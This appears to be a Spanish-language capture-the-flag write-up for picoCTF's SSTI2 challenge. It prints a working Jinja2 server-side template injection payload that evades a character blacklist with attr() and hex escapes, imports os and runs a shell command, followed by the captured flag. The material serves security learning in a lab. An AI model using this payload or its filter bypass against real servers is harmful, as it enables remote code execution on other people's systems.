## Descripción

¡Creé una página web genial donde puedes anunciar lo que quieras! Leí sobre la sanitización de entradas, así que ahora elimino cualquier carácter que pueda causar problemas :)

¡He oído que usar plantillas es una forma genial y modular de crear aplicaciones web! ¡Visita mi sitio web [aquí](http://shape-facility.picoctf.net:56443/) !

El título **SSTI2** significa **Server-Side Template Injection** (Inyección de Plantillas del Lado del Servidor). Básicamente, la página usa un "motor de plantillas" para mostrar lo que escribes, pero el servidor está confundiendo tu texto con **código ejecutable**.
## Solución

**Solución 1
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 |
 |
 v
Flag : picoCTF{sst1_f1lt3r_byp4ss_e39c23ee}

```

#### NOTAS
Explotación de una vulnerabilidad de Inyección de Plantillas del Lado del Servidor (Server-Side Template Injection - SSTI) en Jinja2 evadiendo una lista negra (blacklist bypass). Se logró Ejecución Remota de Código (RCE) esquivando la restricción de puntos (`.`) y guiones bajos (`_`) mediante el uso del filtro nativo `attr()` y la representación hexadecimal de los caracteres bloqueados (ej. `\x5f` para el guion bajo)